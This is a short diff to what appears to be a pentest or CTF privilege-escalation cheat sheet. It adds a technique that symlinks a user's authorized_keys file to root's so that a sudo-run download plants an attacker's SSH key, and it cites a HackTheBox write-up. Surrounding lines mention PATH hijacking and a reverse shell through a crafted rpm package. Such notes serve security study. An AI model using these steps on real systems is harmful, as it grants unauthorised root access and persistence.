@@ -68,6 +68,17 @@ strings /path/to/binary
 > If we find calls to an executable using relative path, we can create a malicious script using the binary name and update PATH to include the folder
 
 ## Local exploits
+### Overwrite file with symlink
+Scenario : if root write a file in a folder for which you have write permission, it's possible to overwrite a file only root can write by creating a symlink to the target file.
+Example : https://0xdedinfosec.vercel.app/posts/hackthebox-timing-writeup
+```bash
+# lowpriv can download a file as root via sudo to his home directory.
+# create a symlink to /root/.ssh/authorized_keys
+# on attack machine, serve a public key named authorized_keys
+# download the file as root which will overwrite the link target
+ln -s /root/.ssh/authorized_keys ~/.ssh/authorized_keys
+sudo ....... (download authorized_keys > /root/.ssh/)
+```
 ### yum
 - Get a reverse shell using crafted rpm package
 
